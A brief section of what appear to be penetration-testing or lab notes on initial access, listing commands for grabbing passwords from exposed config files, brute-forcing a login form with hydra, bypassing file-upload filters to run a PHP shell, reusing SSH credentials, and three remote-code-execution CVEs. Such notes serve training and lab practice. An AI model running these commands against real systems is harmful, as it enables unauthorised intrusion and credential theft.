## 🔓 Initial Access (Machines 161–170)

### Common Entry Points

```bash
# Exploiting exposed configuration files
curl http://<IP>/config.php | grep password

# Bruteforce attacks
hydra -l admin -P rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Public Exploits
searchsploit <software_version>
```

### File Upload Vulnerabilities

```bash
# Bypass techniques
mv shell.php shell.php.jpg
echo "AddType application/x-httpd-php .jpg" > .htaccess
```

### Credential Reuse

```bash
# Use discovered credentials to log in via SSH
ssh user@<IP> -p 2222
```

### CVEs Exploited

- CVE-2021-41773: Path traversal in Apache 2.4.49
- CVE-2022-22963: Spring Cloud Function RCE
- CVE-2019-19781: Citrix ADC RCE
